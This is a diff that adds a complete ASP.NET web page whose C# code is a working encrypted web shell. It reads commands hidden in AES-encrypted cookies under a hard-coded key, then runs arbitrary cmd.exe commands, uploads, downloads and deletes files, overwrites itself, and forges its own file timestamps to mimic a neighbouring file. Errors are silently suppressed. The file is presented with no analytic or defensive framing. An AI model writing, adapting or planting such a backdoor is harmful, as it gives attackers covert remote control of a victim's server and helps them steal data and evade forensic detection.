@@ -1,0 +1,110 @@
+<%@ Page Language="C#" EnableViewState="false" %>
+<%@ Import Namespace="System.Diagnostics" %>
+<%@ Import Namespace="System.IO" %>
+<%@ Import Namespace="System.Security.Cryptography" %>
+<%@ Import Namespace="System" %>
+
+<% 
+    string key = "J8fs4F4rnP7nFl#f";
+    string iv = "D68gq#5p0(3Ndsk!";
+    Rijndael crypt = Rijndael.Create();
+    crypt.Mode = CipherMode.CBC;
+    crypt.Padding = PaddingMode.Zeros;
+    crypt.BlockSize = 128;
+    crypt.KeySize = 128;
+    crypt.Key = UTF8Encoding.UTF8.GetBytes(key);
+    crypt.IV = UTF8Encoding.UTF8.GetBytes(iv);
+
+    ICryptoTransform cEncryptor = crypt.CreateEncryptor(crypt.Key, crypt.IV);
+    ICryptoTransform cDecryptor = crypt.CreateDecryptor(crypt.Key, crypt.IV);
+       
+    string WorkDir = Environment.GetEnvironmentVariable("temp");
+    char[] charsToTrim = { '\0' };
+    int loop1, loop2;
+    HttpCookieCollection MyCookieColl;
+    HttpCookie MyCookie;
+    string CmdOut = "";
+    
+    MyCookieColl = Request.Cookies;
+    try
+    {
+        String[] arr1 = MyCookieColl.AllKeys;
+        for (loop1 = 0; loop1 < arr1.Length; loop1++)
+        {
+            MyCookie = MyCookieColl[arr1[loop1]];
+            byte[] CryptArray = Convert.FromBase64String(MyCookie.Value.ToString());
+            byte[] DecryptArray = cDecryptor.TransformFinalBlock(CryptArray, 0, CryptArray.Length);
+            string DecryptStr = UTF8Encoding.UTF8.GetString(DecryptArray).Trim(charsToTrim);
+            string[] cmds = DecryptStr.Split('&');
+            for (loop2 = 0; loop2 < cmds.Length; loop2++)
+            {
+                string[] temp = cmds[loop2].Split(';');
+                switch (temp[0])
+                {
+                    case "put":
+                        string FileNameSv = UTF8Encoding.UTF8.GetString(Convert.FromBase64String(temp[1]));
+                        FileNameSv = WorkDir + "\\" + FileNameSv;
+                        byte[] file_out_byte = Convert.FromBase64String(Request.Params["data"]);
+                        byte[] FileBytes = cDecryptor.TransformFinalBlock(file_out_byte, 0, file_out_byte.Length);
+                        System.IO.File.WriteAllBytes(FileNameSv, FileBytes);
+                        CmdOut += "File successfully wrote to: " + FileNameSv + "\n";
+                        break;
+                    case "update":
+                        string FileNameScr = Request.PhysicalPath;
+                        byte[] file_out_scr_byte = Convert.FromBase64String(Request.Params["data"]);
+                        byte[] FileScrBytes = cDecryptor.TransformFinalBlock(file_out_scr_byte, 0, file_out_scr_byte.Length);
+                        System.IO.File.WriteAllBytes(FileNameScr, FileScrBytes);
+                        CmdOut += "File " + FileNameScr + " wrote successfully\n";
+                        break;
+                    case "time":
+                        string FileNameSet = Request.PhysicalPath;
+                        string FileNameGet = Path.GetDirectoryName(Request.PhysicalPath) + "\\" + UTF8Encoding.UTF8.GetString(Convert.FromBase64String(temp[1]));
+                        File.SetCreationTime(FileNameSet, File.GetCreationTime(FileNameGet));
+                        File.SetLastWriteTime(FileNameSet, File.GetLastWriteTime(FileNameGet));
+                        File.SetLastAccessTime(FileNameSet, File.GetLastAccessTime(FileNameGet));
+                        CmdOut += "Date changed successfully like: " + FileNameGet + "\n";
+                        break;
+                    case "cmd":
+                        Process p = new Process();
+                        p.StartInfo.CreateNoWindow = true;
+                        p.StartInfo.FileName = "cmd" + "." + "exe";
+                        p.StartInfo.Arguments = "/c " + UTF8Encoding.UTF8.GetString(Convert.FromBase64String(temp[1]));
+                        p.StartInfo.UseShellExecute = false;
+                        p.StartInfo.RedirectStandardOutput = true;
+                        p.StartInfo.RedirectStandardError = true;
+                        p.StartInfo.WorkingDirectory = WorkDir;
+                        p.Start();
+                        CmdOut += p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
+                        break;
+                    case "del":
+                        string FileDelName = UTF8Encoding.UTF8.GetString(Convert.FromBase64String(temp[1]));
+                        if (Path.IsPathRooted(FileDelName) != true)
+                            FileDelName = WorkDir + "\\" + FileDelName;
+                        File.Delete(FileDelName);
+                        CmdOut += "File " + FileDelName + " deleted successfully\n";
+                        break;
+                    case "get":
+                        Response.ClearContent();
+                        string FileName = UTF8Encoding.UTF8.GetString(Convert.FromBase64String(temp[1]));
+                        if (Path.IsPathRooted(FileName) != true)
+                            FileName = WorkDir + "\\" + FileName;
+                        byte[] fileBytes = System.IO.File.ReadAllBytes(FileName);
+                        string resp = Convert.ToBase64String(cEncryptor.TransformFinalBlock(fileBytes, 0, fileBytes.Length));
+                        Response.Write(resp);
+                        return;
+                }
+            }
+            byte[] CmdOutArray = UTF8Encoding.UTF8.GetBytes(CmdOut);
+            string base64EncodedString = Convert.ToBase64String(cEncryptor.TransformFinalBlock(CmdOutArray, 0, CmdOutArray.Length));
+            Response.Write(base64EncodedString);
+        }
+    }
+    catch (Exception e)
+    {
+        //Response.Write(e.ToString());
+    }
+
+    //if (CmdOut == "")
+    //    Response.Redirect("./", true);
+%>
+ 
